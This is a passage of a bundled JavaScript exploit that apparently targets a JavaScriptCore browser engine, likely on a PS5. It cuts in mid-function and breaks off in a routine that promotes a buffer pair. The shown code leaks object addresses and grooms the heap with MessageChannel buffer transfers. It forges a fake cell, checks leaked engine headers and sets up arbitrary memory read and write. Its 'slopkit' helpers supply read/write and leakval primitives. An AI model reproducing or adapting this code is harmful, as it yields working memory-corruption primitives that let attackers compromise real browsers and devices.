      profile.carrierType = rwHeader[5];
      profile.carrierFlags = rwHeader[6];
      profile.carrierMode = rwHeader[28];
      profile.carrierByte28 = rwHeader[40];
      profile.carrierByte20 = rwHeader[32];
      rwHeaderOK = rwSID >= 256 && rwSID < 134217728 && rwHeader[4] === 0 && (rwHeader[7] === 0 || rwHeader[7] === 1) && rwHeader[14] === 0 && rwHeader[15] === 0 && rwButterfly > 4294967296 && rwButterfly % 8 === 0 && rwHeader[22] === 0 && rwHeader[23] === 0 && rwOriginalVector > 4294967296 && rwOriginalVector % 8 === 0 && rwLength === RW_BUFFER_SIZE && rwHeader[29] === 0 && rwHeader[30] === 0 && rwHeader[31] === 0 && rwOffsetZero;
      if (!rwHeaderOK) {
        zeroHeaderMiss = allZero(rwHeader, 0, CELL_BYTES);
        retrySafe = zeroHeaderMiss && !rwVectorTouched && !candidateMutationStarted;
        candidate = null;
        clearPredecessor();
        compositionState = 3;
        return;
      }
      rwVectorTouched = true;
      const identityProved = runIdentityProof(candidate);
      rwVectorTouched = false;
      if (!identityProved) {
        candidate = null;
        clearPredecessor();
        compositionState = 3;
        return;
      }
      for (let i = 0; i < 8; ++i)
        scratchBytes[i] = rwHeader[i];
      if (scratchBytes[6] >= 2) {
        scratchBytes[6] -= 2;
      } else {
        scratchBytes[6] = scratchBytes[6] + 256 - 2 & 255;
        scratchBytes[7] = scratchBytes[7] - 1 & 255;
      }
      const upgradedHeader = scratchDouble[0];
      const upgradedFinite = upgradedHeader === upgradedHeader && upgradedHeader !== Infinity && upgradedHeader !== -Infinity;
      if (!upgradedFinite) {
        candidate = null;
        clearPredecessor();
        compositionState = 3;
        return;
      }
      candidateMutationStarted = true;
      fakeHost.q0 = upgradedHeader;
      if (fakeHost.q0 !== upgradedHeader) {
        candidate = null;
        clearPredecessor();
        compositionState = 3;
        return;
      }
      rwVectorTouched = true;
      aimCarrier(candidate, targetAddress);
      const holderRepeated = readTwiceMatches(
        holderHeader,
        rwView,
        HOLDER_BYTES
      );
      const holderSID = uint32At(holderHeader, 0);
      const holderButterflyZero = allZero(holderHeader, 8, 16);
      nativeTargetAddress = low48At(holderHeader, 16);
      anchorElementAddress = low48At(holderHeader, 24);
      markerAAddress = low48At(holderHeader, 32);
      markerBAddress = low48At(holderHeader, 40);
      const holderGuardAAddress = low48At(holderHeader, 48);
      const holderGuardBAddress = low48At(holderHeader, 56);
      profile.holderSID = holderSID;
      profile.holderType = holderHeader[5];
      profile.holderFlags = holderHeader[6];
      holderHeaderOK = holderRepeated && holderSID >= 256 && holderSID < 134217728 && targetAddress % 16 === 0 && holderHeader[4] === 0 && (holderHeader[7] === 0 || holderHeader[7] === 1) && holderButterflyZero && plausibleCell(nativeTargetAddress) && plausibleCell(anchorElementAddress) && plausibleCell(markerAAddress) && plausibleCell(markerBAddress) && plausibleCell(holderGuardAAddress) && plausibleCell(holderGuardBAddress) && canonicalLow48(holderHeader, 16) && canonicalLow48(holderHeader, 24) && canonicalLow48(holderHeader, 32) && canonicalLow48(holderHeader, 40) && canonicalLow48(holderHeader, 48) && canonicalLow48(holderHeader, 56) && nativeTargetAddress !== anchorElementAddress && nativeTargetAddress !== markerAAddress && anchorElementAddress !== markerAAddress && markerAAddress !== markerBAddress && holderGuardAAddress !== holderGuardBAddress;
      if (!holderHeaderOK) {
        restoreCarrier(candidate);
        rwVectorTouched = false;
        candidate = null;
        clearPredecessor();
        compositionState = 3;
        return;
      }
      aimCarrier(candidate, nativeTargetAddress);
      readBytes(targetHeader, rwView, FUNCTION_BYTES);
      functionStructureID = uint32At(targetHeader, 0);
      const functionButterfly = low48At(targetHeader, 8);
      const functionScope = low48At(targetHeader, 16);
      executableAddress = low48At(targetHeader, 24);
      profile.functionSID = functionStructureID;
      profile.functionType = targetHeader[5];
      profile.functionFlags = targetHeader[6];
      const functionType1 = targetHeader[5];
      functionHeaderOK = functionStructureID >= 256 && functionStructureID < 134217728 && nativeTargetAddress % 16 === 0 && targetHeader[4] === 0 && (targetHeader[7] === 0 || targetHeader[7] === 1) && targetHeader[14] === 0 && targetHeader[15] === 0 && targetHeader[22] === 0 && targetHeader[23] === 0 && targetHeader[30] === 0 && targetHeader[31] === 0 && functionButterfly > 4294967296 && functionButterfly <= 281474976710655 && functionButterfly % 8 === 0 && functionScope > 4294967296 && functionScope <= 281474976710655 && functionScope % 8 === 0 && executableAddress > 4294967296 && executableAddress <= 281474976710655 && executableAddress % 16 === 0 && (executableAddress & 1) === 0;
      if (!functionHeaderOK) {
        restoreCarrier(candidate);
        rwVectorTouched = false;
        candidate = null;
        clearPredecessor();
        compositionState = 3;
        return;
      }
      aimCarrier(candidate, executableAddress);
      readBytes(targetHeader, rwView, NATIVE_EXECUTABLE_BYTES);
      nativeExecutableStructureID = uint32At(targetHeader, 0);
      nativeFunctionAddress = low48At(targetHeader, 40);
      nativeConstructorAddress = low48At(targetHeader, 48);
      profile.nativeExecSID = nativeExecutableStructureID;
      profile.nativeExecType = targetHeader[5];
      profile.nativeExecFlags = targetHeader[6];
      try {
        globalThis.__ps5NativeCtor = nativeConstructorAddress;
      } catch (e) {
      }
      const nativeExecType1 = targetHeader[5];
      nativeExecutableHeaderOK = nativeExecutableStructureID >= 256 && nativeExecutableStructureID < 134217728 && targetHeader[4] === 0 && (targetHeader[7] === 0 || targetHeader[7] === 1) && targetHeader[46] === 0 && targetHeader[47] === 0 && targetHeader[54] === 0 && targetHeader[55] === 0 && plausibleAddress(nativeFunctionAddress) && plausibleAddress(nativeConstructorAddress) && canonicalLow48(targetHeader, 40) && canonicalLow48(targetHeader, 48) && nativeFunctionAddress !== nativeConstructorAddress;
      if (!nativeExecutableHeaderOK) {
        restoreCarrier(candidate);
        rwVectorTouched = false;
        candidate = null;
        clearPredecessor();
        compositionState = 3;
        return;
      }
      aimCarrier(candidate, nativeTargetAddress);
      const executableAddress2 = low48At(rwView, 24);
      const functionType2 = rwView[5];
      aimCarrier(candidate, executableAddress);
      const nativeFunctionAddress2 = low48At(rwView, 40);
      const nativeConstructorAddress2 = low48At(rwView, 48);
      const nativeExecutableType2 = rwView[5];
      pointersRepeated = executableAddress2 === executableAddress && nativeFunctionAddress2 === nativeFunctionAddress && nativeConstructorAddress2 === nativeConstructorAddress && functionType2 === functionType1 && nativeExecutableType2 === nativeExecType1;
      restoreCarrier(candidate);
      rwVectorTouched = false;
      targetView[0] = 165;
      rwMirror[0] = 60;
      restoreObserved = rwView[0] === 60 && rwMirror[0] === 60 && targetView[0] === 165;
      liveCandidate = candidate;
      candidate = null;
      clearPredecessor();
      compositionState = 1;
    } catch (error) {
      retrySafe = candidate === null && result === null && !rwHeaderCaptured && error?.name === "TypeError";
      if (result !== null) {
        try {
          result[DUPLICATE_INDEX] = void 0;
        } catch {
        }
      }
      if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
        try {
          restoreCarrier(candidate);
        } catch {
        }
      }
      candidate = null;
      result = null;
      try {
        targetView[0] = 165;
      } catch {
      }
      try {
        rwMirror[0] = 60;
      } catch {
      }
      try {
        clearPredecessor();
      } catch {
      }
      compositionError = error;
      compositionState = -1;
    }
  }
  function runGroomAndLoad() {
    try {
      emit("SSV-GROOM-ENTER", `n=${DRAIN_COUNT}`);
      const channel = new MessageChannel();
      channel.port1.close();
      channel.port2.close();
      for (let i = 0; i < DRAIN_COUNT; ++i)
        keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
      let slab = buffer(SLAB_SIZE);
      channel.port1.postMessage(0, [slab]);
      slab = null;
      const butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
      const butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
      const separator = buffer(SEPARATOR_SIZE);
      const earlyHole = buffer(EARLY_HOLE_SIZE);
      const guard = buffer(GUARD_SIZE);
      const predecessor = buffer(PREDECESSOR_SIZE);
      const finalHole = buffer(FINAL_HOLE_SIZE);
      fillRawCellPointers(predecessor, fakeAddress);
      keepAlive[keepIndex++] = separator;
      keepAlive[keepIndex++] = guard;
      keepAlive[keepIndex++] = predecessor;
      emit("PREDECESSOR-FILLED", `qwords=${PREDECESSOR_SIZE / 8}-fake=${hex(fakeAddress)}`);
      criticalBarrier(fakeAddress, targetAddress);
      channel.port1.postMessage(0, [
        butterflyHole1,
        butterflyHole2,
        earlyHole,
        finalHole
      ]);
      loadHistoryCritical();
    } catch (error) {
      try {
        clearPredecessor();
      } catch {
      }
      retrySafe = true;
      compositionError = error;
      compositionState = -1;
    }
    reportComposition();
  }
  var barrierNode = null;
  function ensureBarrierNode() {
    if (barrierNode !== null)
      return;
    try {
      barrierNode = document.createElement("div");
      barrierNode.style.cssText = "position:absolute;left:-9999px;top:0";
      document.body.appendChild(barrierNode);
    } catch {
      barrierNode = null;
    }
  }
  function defaultCriticalBarrier(fake, target) {
    try {
      const line = `CRITICAL-LOAD-NEXT-fake=${hex(fake)}-target=${hex(target)}`;
      if (barrierNode !== null) {
        barrierNode.textContent = line;
        void barrierNode.offsetWidth;
      }
      void new Blob([line], { type: "text/plain" });
      try {
        sessionStorage.setItem(burstKey, line);
      } catch {
      }
    } catch {
    }
  }
  function beginComposition() {
    if (captureState === 0) {
      finishEarlySafeAttempt(
        "ADDROF-NO-RESULT",
        "capture-task-did-not-finish",
        "addrof-no-result"
      );
      return;
    }
    if (captureState < 0) {
      finishEarlySafeAttempt(
        "ADDROF-THREW",
        `${captureError?.name}:` + String(captureError?.message).slice(0, 80),
        "addrof-threw"
      );
      return;
    }
    const a0 = pointerFromWords(capturedWords, 0);
    const b0 = pointerFromWords(capturedWords, 4);
    const a1 = pointerFromWords(capturedWords, 8);
    const b1 = pointerFromWords(capturedWords, 12);
    const repeated = a0 === a1 && b0 === b1;
    const distinct = a0 !== b0;
    const plausible = plausibleCell(a0) && plausibleCell(b0) && plausibleCell(a1) && plausibleCell(b1);
    const fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
    const sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
    emit("ADDROF-RETURNED", REVISION);
    emit("ADDROF-COPY", `chars=${copiedLength}-source-covered=${sourceCovered}`);
    emit("ADDROF-POINTERS", `HOST=${hex(a0)}-TARGET=${hex(b0)}-HOST2=${hex(a1)}-TARGET2=${hex(b1)}`);
    if (!(repeated && distinct && plausible && sourceCovered)) {
      finishEarlySafeAttempt(
        "ADDROF-FAIL",
        `repeat=${repeated}-distinct=${distinct}-plausible=${plausible}-covered=${sourceCovered}`,
        "addrof-validation"
      );
      return;
    }
    hostAddress = a0;
    targetAddress = b0;
    targetAddressHigh = Math.floor(targetAddress / 4294967296);
    targetAddressLow = targetAddress - targetAddressHigh * 4294967296;
    if (targetAddressHigh < 0 || targetAddressHigh > 65535 || targetAddressLow < 0 || targetAddressLow > 4294967295 || Math.floor(targetAddressLow) !== targetAddressLow || targetAddressLow + targetAddressHigh * 4294967296 !== targetAddress) {
      finishEarlySafeAttempt(
        "TARGET-ADDRESS-FAIL",
        `target=${hex(targetAddress)}`,
        "target-address"
      );
      return;
    }
    fakeAddress = hostAddress + 16;
    if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 16) {
      finishEarlySafeAttempt(
        "FAKE-ADDRESS-FAIL",
        `host=${hex(hostAddress)}`,
        "fake-address"
      );
      return;
    }
    emit("FAKE-ADDRESS", `host=${hex(hostAddress)}-fake=${hex(fakeAddress)}-delta=0x10`);
    runGroomAndLoad();
  }
  function reportComposition() {
    if (compositionState < 0) {
      emit(
        retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
        `${compositionError?.name}:` + String(compositionError?.message).slice(0, 80)
      );
      if (!retrySafe)
        failed();
      else
        scheduleSafeRetry("placement-throw");
      return;
    }
    if (compositionState === 2) {
      emit("NORMAL-CLONE-MISS", "known-reference-returned=true");
      scheduleSafeRetry("normal-clone-miss");
      return;
    }
    if (compositionState === 3) {
      emit(
        identityResult === -1 ? "CARRIER-IDENTITY-FAIL" : zeroHeaderMiss ? "ZERO-HEADER-MISS" : retrySafe ? "COMPOSITION-LENGTH-MISS" : "VALIDATION-MISMATCH",
        `rw=${rwHeaderOK}-holder=${holderHeaderOK}-function=${functionHeaderOK}-native-executable=${nativeExecutableHeaderOK}-repeat=${pointersRepeated}-retry-safe=${retrySafe}-identity=${identityResult}-hex=${dumpHex(rwHeader, CELL_BYTES)}`
      );
      if (!retrySafe)
        failed();
      else
        scheduleSafeRetry(zeroHeaderMiss ? "zero-header-miss" : "composition-length-mismatch");
      return;
    }
    if (compositionState === 0) {
      emit("NO-RESULT", "critical-load-did-not-finish");
      failed();
      return;
    }
    emit("SSV-RETURNED-CLEARED", `length=${compositionLength}-predecessor-cleared=true`);
    emit("RW-CARRIER", `sid=${hex(profile.carrierSID)}-vector=${hex(rwOriginalVector)}-length=${hex(uint32At(rwHeader, 24))}-mode=${hex(profile.carrierMode)}`);
    emit("HOLDER", `cell=${hex(targetAddress)}-textarea=${hex(anchorElementAddress)}-markerA=${hex(markerAAddress)}-markerB=${hex(markerBAddress)}`);
    emit("JSC-PROFILE", `u8=${hex(profile.carrierType)}-u8flags=${hex(profile.carrierFlags)}-mode=${hex(profile.carrierMode)}-obj=${hex(profile.holderType)}-objflags=${hex(profile.holderFlags)}-fn=${hex(profile.functionType)}-fnflags=${hex(profile.functionFlags)}-nx=${hex(profile.nativeExecType)}-nxflags=${hex(profile.nativeExecFlags)}`);
    emit("RW-HEADER-HEX", dumpHex(rwHeader, CELL_BYTES));
    const leakPass = rwHeaderOK && holderHeaderOK && functionHeaderOK && nativeExecutableHeaderOK && pointersRepeated && restoreObserved && compositionLength === EXPECTED_LENGTH && liveCandidate !== null;
    if (!leakPass) {
      emit("READ-PRIMITIVE-MISMATCH", `rw=${rwHeaderOK}-holder=${holderHeaderOK}-function=${functionHeaderOK}-native=${nativeExecutableHeaderOK}-repeat=${pointersRepeated}-restore=${restoreObserved}`);
      liveCandidate = null;
      failed();
      return;
    }
    emit("READ-PRIMITIVE-PASS", "arbitrary-read-established-firmware-offsets-asserted=none");
    try {
      history.replaceState(null, "");
    } catch {
    }
    stopped = true;
    running = false;
    const resolve = settleResolve;
    settleResolve = null;
    settleReject = null;
    if (resolve !== null)
      resolve(buildCarrier());
  }
  function buildCarrier() {
    profile.cellSize = 32;
    return {
      aim(address) {
        if (liveCandidate === null)
          throw new Error("core.aim: carrier is no longer live");
        if (!plausibleAddress(address))
          throw new RangeError(`core.aim: implausible address ${address}`);
        aimCarrier(liveCandidate, address);
      },
      restore() {
        if (liveCandidate === null)
          throw new Error("core.restore: carrier is no longer live");
        restoreCarrier(liveCandidate);
      },
      get view() {
        return rwView;
      },
      windowBytes: RW_BUFFER_SIZE,
      holder: targetHolder,
      holderAddress: targetAddress,
      leakSlotOffset: LEAK_SLOT_OFFSET,
      leakSlotAddress: targetAddress + LEAK_SLOT_OFFSET,
      setLeakSlot(value) {
        targetHolder.q2 = value;
      },
      clearLeakSlot() {
        targetHolder.q2 = markerObjectA;
      },
      anchorObject: markerObjectA,
      anchorObjectAddress: markerAAddress,
      textarea: anchorElement,
      textareaAddress: anchorElementAddress,
      profile,
      attempts: attemptNumber,
      validate: plausibleAddress,
      hostAddress,
      fakeAddress,
      assertHome() {
        if (liveCandidate === null || rwView === null || targetView === null || rwMirror === null)
          return false;
        return rwView[0] === 60 && rwMirror[0] === 60 && targetView[0] === 165;
      }
    };
  }
  function establishPrimitive(options) {
    const opts = options || {};
    if (fakeReleased)
      return Promise.reject(new Error(
        "core: the fake cell has been released to the real-cell pair -- establishPrimitive cannot run again in this page"
      ));
    if (running)
      return Promise.reject(new Error("core: already running"));
    if (typeof BigInt !== "function" || typeof MessageChannel !== "function" || typeof Symbol !== "function" || typeof history === "undefined" || typeof history.replaceState !== "function")
      return Promise.reject(new Error("core: unsupported browser"));
    onEvent = typeof opts.onEvent === "function" ? opts.onEvent : null;
    criticalBarrier = typeof opts.beforeCriticalLoad === "function" ? opts.beforeCriticalLoad : defaultCriticalBarrier;
    if (criticalBarrier === defaultCriticalBarrier)
      ensureBarrierNode();
    attemptCeiling = typeof opts.maxAttempts === "number" && opts.maxAttempts > 0 ? opts.maxAttempts : 0;
    running = true;
    stopped = false;
    attemptNumber = 1;
    try {
      sessionStorage.removeItem(attemptKey);
    } catch {
    }
    return new Promise((resolve, reject) => {
      settleResolve = resolve;
      settleReject = reject;
      startAttempt();
    });
  }
  var RELEASED_BINDINGS = [
    "liveCandidate",
    "fakeHost",
    "lengthWord",
    "getterCarrier",
    "leakedScope",
    "preparedSymbolObject",
    "capturedString",
    "capturedWords",
    "predecessorWords",
    "outerGraph",
    "fillerGraph",
    "referenceTarget",
    "keepAlive"
  ];
  function releaseFakeCell() {
    const report = {
      released: RELEASED_BINDINGS.slice(),
      alreadyReleased: fakeReleased,
      hostAddress,
      fakeAddress,
      historyCleared: false
    };
    if (fakeReleased)
      return report;
    liveCandidate = null;
    fakeHost = null;
    lengthWord = null;
    getterCarrier = null;
    leakedScope = null;
    preparedSymbolObject = null;
    capturedString = null;
    capturedWords = null;
    predecessorWords = null;
    outerGraph = null;
    fillerGraph = null;
    referenceTarget = null;
    keepAlive = null;
    try {
      history.replaceState(null, "");
      report.historyCleared = history.state === null;
    } catch (_) {
    }
    fakeReleased = true;
    stopped = true;
    running = false;
    retryScheduled = false;
    return report;
  }
  function fakeCellReleased() {
    return fakeReleased;
  }
  function carrierHeaderCopy() {
    return rwHeader.slice(0, CELL_BYTES);
  }
  function carrierHomeVector() {
    return rwOriginalVector;
  }

  // slopkit/int64.js
  function zeroFill(number, width) {
    width -= number.toString().length;
    if (width > 0) {
      return new Array(width + (/\./.test(number) ? 2 : 1)).join("0") + number;
    }
    return number + "";
  }
  function int64(low, hi) {
    this.low = low >>> 0;
    this.hi = hi >>> 0;
    this.backing = null;
    this.add32inplace = function(val) {
      let new_lo = ((this.low >>> 0) + val & 4294967295) >>> 0;
      let new_hi = this.hi >>> 0;
      if (new_lo < this.low) {
        new_hi++;
      }
      this.hi = new_hi;
      this.low = new_lo;
      if (this.backing !== null) {
        if (this.backing.byteLength < val) {
          throw new Error("int64.add32inplace: overflow");
        }
        this.backing = new Uint8Array(this.backing.buffer, val, this.backing.byteLength - val);
      }
    };
    this.add32 = function(val) {
      let new_lo = ((this.low >>> 0) + val & 4294967295) >>> 0;
      let new_hi = this.hi >>> 0;
      if (new_lo < this.low) {
        new_hi++;
      }
      let ret = new int64(new_lo, new_hi);
      if (this.backing !== null) {
        if (this.backing.byteLength < val) {
          throw new Error("int64.add32: overflow");
        }
        ret.backing = new Uint8Array(this.backing.buffer, val, this.backing.byteLength - val);
      }
      return ret;
    };
    this.sub32 = function(val) {
      let new_lo = ((this.low >>> 0) - val & 4294967295) >>> 0;
      let new_hi = this.hi >>> 0;
      if (new_lo > this.low & 4294967295) {
        new_hi--;
      }
      return new int64(new_lo, new_hi);
    };
    this.sub32inplace = function(val) {
      let new_lo = ((this.low >>> 0) - val & 4294967295) >>> 0;
      let new_hi = this.hi >>> 0;
      if (new_lo > this.low & 4294967295) {
        new_hi--;
      }
      this.hi = new_hi;
      this.low = new_lo;
    };
    this.and32 = function(val) {
      let new_lo = this.low & val;
      let new_hi = this.hi;
      return new int64(new_lo, new_hi);
    };
    this.and64 = function(vallo, valhi) {
      let new_lo = this.low & vallo;
      let new_hi = this.hi & valhi;
      return new int64(new_lo, new_hi);
    };
    this.toString = function(radix = 16) {
      let lo_str = (this.low >>> 0).toString(radix);
      let hi_str = (this.hi >>> 0).toString(radix);
      if (this.hi == 0) {
        return lo_str;
      } else {
        const width = radix === 16 ? 8 : Math.ceil(32 / Math.log2(radix));
        lo_str = zeroFill(lo_str, width);
      }
      return hi_str + lo_str;
    };
    return this;
  }
  globalThis.int64 = int64;

  // slopkit/mem.js
  var carrier = null;
  function toI64(x) {
    if (x instanceof int64)
      return x;
    if (typeof x === "number") {
      if (!Number.isFinite(x) || Math.floor(x) !== x || x < 0)
        throw new TypeError(`mem: bad numeric address ${x}`);
      const hi = Math.floor(x / 4294967296);
      return new int64(x - hi * 4294967296, hi);
    }
    if (x !== null && typeof x === "object" && "low" in x)
      return new int64(x.low, "hi" in x ? x.hi : x.high);
    throw new TypeError("mem: bad address");
  }
  function addrNumber(x) {
    const a = toI64(x);
    if (a.hi > 65535)
      throw new RangeError(`mem: non-canonical address 0x${a.toString()}`);
    return a.hi * 4294967296 + a.low;
  }
  function aimFor(addrLike, size) {
    const address = addrNumber(addrLike);
    if (size > carrier.windowBytes)
      throw new RangeError(`mem: ${size} exceeds the ${carrier.windowBytes}-byte window`);
    carrier.aim(address);
    return address;
  }
  function valueLow32(value, who) {
    if (typeof value === "number") {
      if (!Number.isFinite(value) || Math.floor(value) !== value)
        throw new TypeError(`${who}: non-integer value ${value}`);
      return value >>> 0;
    }
    if (value instanceof int64)
      return value.low >>> 0;
    if (value !== null && typeof value === "object" && "low" in value)
      return toI64(value).low >>> 0;
    throw new TypeError(`${who}: value must be a number or an int64`);
  }
  function read1(addr) {
    aimFor(addr, 1);
    try {
      return carrier.view[0];
    } finally {
      carrier.restore();
    }
  }
  function read2(addr) {
    aimFor(addr, 2);
    try {
      const v = carrier.view;
      return v[0] | v[1] << 8;
    } finally {
      carrier.restore();
    }
  }
  function read4(addr) {
    aimFor(addr, 4);
    try {
      const v = carrier.view;
      return (v[0] | v[1] << 8 | v[2] << 16 | v[3] << 24) >>> 0;
    } finally {
      carrier.restore();
    }
  }
  function read8(addr) {
    let lo, hi;
    aimFor(addr, 8);
    try {
      const v = carrier.view;
      lo = (v[0] | v[1] << 8 | v[2] << 16 | v[3] << 24) >>> 0;
      hi = (v[4] | v[5] << 8 | v[6] << 16 | v[7] << 24) >>> 0;
    } finally {
      carrier.restore();
    }
    return new int64(lo, hi);
  }
  function write1(addr, value) {
    const v = valueLow32(value, "mem.write1") & 255;
    aimFor(addr, 1);
    try {
      carrier.view[0] = v;
    } finally {
      carrier.restore();
    }
  }
  function write2(addr, value) {
    const v = valueLow32(value, "mem.write2") & 65535;
    aimFor(addr, 2);
    try {
      const view = carrier.view;
      view[0] = v & 255;
      view[1] = v >>> 8 & 255;
    } finally {
      carrier.restore();
    }
  }
  function write4(addr, value) {
    const v = valueLow32(value, "mem.write4");
    aimFor(addr, 4);
    try {
      const view = carrier.view;
      view[0] = v & 255;
      view[1] = v >>> 8 & 255;
      view[2] = v >>> 16 & 255;
      view[3] = v >>> 24 & 255;
    } finally {
      carrier.restore();
    }
  }
  function write8(addr, value) {
    let lo, hi;
    if (value instanceof int64) {
      lo = value.low >>> 0;
      hi = value.hi >>> 0;
    } else if (typeof value === "number") {
      if (!Number.isFinite(value) || Math.floor(value) !== value)
        throw new TypeError(`mem.write8: non-integer value ${value}`);
      if (value < 0) {
        if (value < -2147483648)
          throw new RangeError(`mem.write8: value ${value} below int32 range`);
        lo = value >>> 0;
        hi = 4294967295;
      } else if (value <= 4294967295) {
        lo = value >>> 0;
        hi = 0;
      } else {
        throw new RangeError(
          `mem.write8: ${value} exceeds 32 bits -- pass an int64`
        );
      }
    } else if (value !== null && typeof value === "object" && "low" in value) {
      const n = toI64(value);
      lo = n.low;
      hi = n.hi;
    } else {
      throw new TypeError("mem.write8: value must be int64 or number");
    }
    aimFor(addr, 8);
    try {
      const view = carrier.view;
      view[0] = lo & 255;
      view[1] = lo >>> 8 & 255;
      view[2] = lo >>> 16 & 255;
      view[3] = lo >>> 24 & 255;
      view[4] = hi & 255;
      view[5] = hi >>> 8 & 255;
      view[6] = hi >>> 16 & 255;
      view[7] = hi >>> 24 & 255;
    } finally {
      carrier.restore();
    }
  }
  function leakval(obj) {
    if (obj === null || typeof obj !== "object" && typeof obj !== "function")
      throw new TypeError("mem.leakval: not an object");
    carrier.setLeakSlot(obj);
    let lo, hi;
    try {
      aimFor(carrier.leakSlotAddress, 8);
      try {
        const v = carrier.view;
        lo = (v[0] | v[1] << 8 | v[2] << 16 | v[3] << 24) >>> 0;
        hi = (v[4] | v[5] << 8 | v[6] << 16 | v[7] << 24) >>> 0;
      } finally {
        carrier.restore();
      }
    } finally {
      carrier.clearLeakSlot();
    }
    if (hi > 65535 || lo === 0 && hi === 0 || (lo & 7) !== 0)
      throw new Error(`mem.leakval: implausible cell 0x${new int64(lo, hi).toString()}`);
    return new int64(lo, hi);
  }
  function readInto(dest, addr, count) {
    const base = addrNumber(addr);
    let done = 0;
    while (done < count) {
      const chunk = Math.min(count - done, carrier.windowBytes);
      aimFor(base + done, chunk);
      try {
        for (let i = 0; i < chunk; ++i)
          dest[done + i] = carrier.view[i];
      } finally {
        carrier.restore();
      }
      done += chunk;
    }
    return dest;
  }
  var WORKER_BUFFER_SIZE = 256;
  var PAIR_IDENT_OFFSET = 32;
  var MAIN_IDENT_OFFSET = 64;
  var PAIR_HEADER_BYTES = 32;
  var HOME_BYTE = 60;
  var WORKER_LENGTH_MAX = 4294967295;
  var mainMagic = new Uint8Array([99, 158, 31, 41, 210, 132, 11, 92]);
  var workerMagic = new Uint8Array([158, 55, 121, 185, 127, 74, 124, 21]);
  var workerHeader = new Uint8Array(PAIR_HEADER_BYTES);
  var identityBytes2 = new Uint8Array(8);
  var workerOriginalVector = new Uint8Array(8);
  var workerOriginalLength = new Uint8Array(4);
  var pairScratch = new ArrayBuffer(8);
  var pairScratchBytes = new Uint8Array(pairScratch);
  var pairScratchWords = new Uint32Array(pairScratch);
  var mainView = null;
  var workerBuffer = null;
  var workerView = null;
  var workerMirror = null;
  var pairVectorOffset = -1;
  var retained = [];
  var pairStatus = {
    state: "not-attempted",
    promoted: false,
    committed: false,
    rolledBack: false,
    rollbackClean: null,
    fallback: false,
    stage: "not-attempted",
    failedAt: null,
    error: null,
    vectorOffset: -1,
    lengthOffset: -1,
    modeOffset: -1,
    butterflyOffset: -1,
    mainAddress: null,
    mainVector: null,
    mainRecordVector: null,
    mainWindow: -1,
    mainCellFromFakeSlot: null,
    mainIdentity: null,
    mainAtHome: null,
    workerAddress: null,
    workerVector: null,
    workerButterfly: null,
    workerWindow: -1,
    workerLength: -1,
    workerIdentity: null,
    structureID: -1,
    mode: -1,
    leakvalAgrees: false,
    fakeAddress: null,
    fakeButterfly: null,
    released: []
  };
  function u32At(bytes, offset) {
    return (bytes[offset] | bytes[offset + 1] << 8 | bytes[offset + 2] << 16 | bytes[offset + 3] << 24) >>> 0;
  }
  function low48At2(bytes, offset) {
    return bytes[offset] + bytes[offset + 1] * 256 + bytes[offset + 2] * 65536 + bytes[offset + 3] * 16777216 + bytes[offset + 4] * 4294967296 + bytes[offset + 5] * 1099511627776;
  }
  function canonical48(bytes, offset) {
    return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
  }
  function sameBytes2(left, right, count) {
    for (let i = 0; i < count; ++i) {
      if (left[i] !== right[i])
        return false;
    }
    return true;
  }
  function hexOf(bytes, count) {
    let out = "";
    for (let i = 0; i < count; ++i)
      out += (bytes[i] & 255).toString(16).padStart(2, "0");
    return out;
  }
  function pairAim(address) {
    const high = Math.floor(address / 4294967296);
    pairScratchWords[0] = address - high * 4294967296;
    pairScratchWords[1] = high;
    for (let i = 0; i < 8; ++i)
      mainView[pairVectorOffset + i] = pairScratchBytes[i];
  }
  function pairRestore() {
    for (let i = 0; i < 8; ++i)
      mainView[pairVectorOffset + i] = workerOriginalVector[i];
  }
  function buildPairCarrier(fake) {
    const validate = fake.validate;
    return {
      aim(address) {
        if (mainView === null || workerView === null)
          throw new Error("mem.pair.aim: the pair has been dropped");
        if (!validate(address))
          throw new RangeError(`mem.pair.aim: implausible address ${address}`);
        pairAim(address);
      },
      restore() {
        if (mainView === null)
          throw new Error("mem.pair.restore: the pair has been dropped");
        pairRestore();
      },
      get view() {
        return workerView;
      },
      windowBytes: WORKER_BUFFER_SIZE,
      holder: fake.holder,
      holderAddress: fake.holderAddress,
      leakSlotOffset: fake.leakSlotOffset,
      leakSlotAddress: fake.leakSlotAddress,
      setLeakSlot: fake.setLeakSlot,
      clearLeakSlot: fake.clearLeakSlot,
      anchorObject: fake.anchorObject,
      anchorObjectAddress: fake.anchorObjectAddress,
      textarea: fake.textarea,
      textareaAddress: fake.textareaAddress,
      profile: fake.profile,
      attempts: fake.attempts,
      validate,
      hostAddress: fake.hostAddress,
      fakeAddress: fake.fakeAddress,
      pair: pairStatus,
      assertHome() {
        if (workerView === null || workerMirror === null)
          return false;
        return workerView[0] === HOME_BYTE && workerMirror[0] === HOME_BYTE;
      }
    };
  }
  function brokenCarrier(why) {
    const die = () => {
      throw new Error(`mem: the primitive is disabled -- the promotion failed and its rollback did not verify (${why})`);
    };
    return {
      aim: die,
      restore: die,
      setLeakSlot: die,
      clearLeakSlot: die,
      get view() {
        return die();
      },
      get windowBytes() {
        return die();
      },
      get leakSlotAddress() {
        return die();
      },
      validate: () => false,
      assertHome: () => false,
      profile: null,
      pair: pairStatus
    };
  }
  function proveMagic(note, who, slot, at, expected, context) {
    const target = toI64(at);
    const record = {
      at: target,
      expected: hexOf(expected, 8),
      found: null,
      pass: false
    };
    pairStatus[slot] = record;
    readInto(identityBytes2, at, 8);
    record.found = hexOf(identityBytes2, 8);
    record.pass = sameBytes2(identityBytes2, expected, 8);
    note(
      `PAIR-IDENTITY-${who.toUpperCase()}`,
      `at=0x${target.toString()}-found=${record.found}-expected=${record.expected}-pass=${record.pass}-${context}`
    );
    if (!record.pass)
      throw new Error(`mem.promote: ${who} identity failed -- read ${record.found} at 0x${target.toString()}, expected ${record.expected} (${context})`);
    return record;
  }
  function promoteToRealPair(onEvent2) {
    const note = (tag, detail) => {
      pairStatus.stage = tag;
      if (typeof onEvent2 === "function") {
        try {
          onEvent2(tag, detail === void 0 ? "" : String(detail));
        } catch {
        }
      }
    };
